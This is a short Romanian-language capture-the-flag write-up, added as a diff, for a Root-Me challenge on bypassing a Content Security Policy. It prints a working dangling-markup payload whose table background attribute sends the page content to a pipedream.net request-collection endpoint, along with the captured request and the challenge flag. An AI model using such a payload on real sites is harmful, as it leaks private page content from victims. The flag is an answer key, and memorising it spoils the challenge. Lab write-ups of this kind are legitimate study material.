@@ -1,0 +1,6 @@
+Am cautat numele meu si am observat ca daca incerc sa folosesc " si sa scriu mai departe un cod HTML site-ul nu va afisa acel continut. Mai departe am folosit un site(requestbin) catre care am redirectat un request de tipul GET pentru a exfiltra flag-ul. Am asteptat cateva minute si am obtinut:
+http://eocd7jakhe53qas.m.pipedream.net/?htmlflag=%20!%3C/h1%3E%20%20%3Cdiv%20class=%22message%22%3E%20%20%20%20%20%20%20%20%3Cp%3EAt%20Quackquack%20corp%20the%20developers%20think%20that%20they%20do%20not%20have%20to%20patch%20XSS%20because%20they%20implement%20the%20Content%20Security%20Policy%20(CSP).%20But%20you%20are%20a%20hacker,%20right%20?%20I%20am%20sure%20you%20will%20be%20able%20to%20exfiltrate%20this%20flag:%20D4NGL1NG_M4RKUP_W1TH_CHR0ME_NO_N3W_LINE.%20(Only%20the%20bot%20is%20able%20to%20see%20the%20flagi%20:
+De aici am extras flag-ul:
+D4NGL1NG_M4RKUP_W1TH_CHR0ME_NO_N3W_LINE
+Am atasat mai jos si poze cu rezultul.
+Mentionez ca se poate folosi orice tag HTML pentru acest atac. Eu am ales sa folosesc http://challenge01.root-me.org:58030/page?user="<table/background='<table/background='//eocd7jakhe53qas.m.pipedream.net?htmlflag= deoarece prin proprietatea background a tag-ului table mi-a fost usor sa introduc payload-ul cu request-ul.
